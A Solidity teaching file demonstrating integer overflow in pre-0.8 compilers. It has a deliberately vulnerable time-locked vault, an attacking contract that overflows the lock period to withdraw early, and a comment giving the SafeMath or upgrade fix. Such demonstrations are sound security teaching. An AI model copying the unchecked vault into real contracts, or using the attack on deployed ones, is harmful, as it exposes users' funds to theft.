//SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

/*
    Arithmetic overflow or underflow does not throw any error prior to solidity 0.8;
    from 0.8 onwards, an error will be thrown out when overflow or underflow happens

*/
contract VaultContract {
    mapping(address => uint) public balances;
    mapping(address => uint) public stakingPeriod;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        stakingPeriod[msg.sender] = block.timestamp + 1 weeks;
    }

    function increasestakingPeriod(uint _seconds) public {
        stakingPeriod[msg.sender] += _seconds;        
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "insufficient fund");
        require(block.timestamp > stakingPeriod[msg.sender], "lock up period not yet ended");
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value : amount}("");
        require(success, "Failed to withdraw fund");
    }
}

/*
    The attacking contract is able to withdraw fund before the lock up period ended
 */
contract AttackingContract {

    VaultContract public vault;

    constructor(address _contract) {
        vault = VaultContract(_contract);
    }

    fallback() external payable {}

    function attack() public payable {

        vault.deposit{value: msg.value}();
        uint lockedPeriod = vault.stakingPeriod(address(this));
        //to increase the number to reach 2**256 + 1 and cause uint overflow
        vault.increasestakingPeriod(
            type(uint).max + 1 - lockedPeriod
        );

        vault.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


// Solution: Using SafeMath library or upgrade contract to Solidity > 0.8.0
// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol


contract ForYourTrying {

    //returns 0
    function uint256Overflow() public pure returns (uint256) {
        return type(uint256).max + 1;
    }

    //returns 2**256 - 1
    function uint256Underflow() public pure returns (uint256) {
        return type(uint256).min - 1;
    }

    //returns 0
    function uint8Overflow() public pure returns (uint8) {
        return type(uint8).max + 1;
    }

    //returns 255
    function uint8Underflow() public pure returns (uint8) {
        return type(uint8).min - 1;
    }
    
}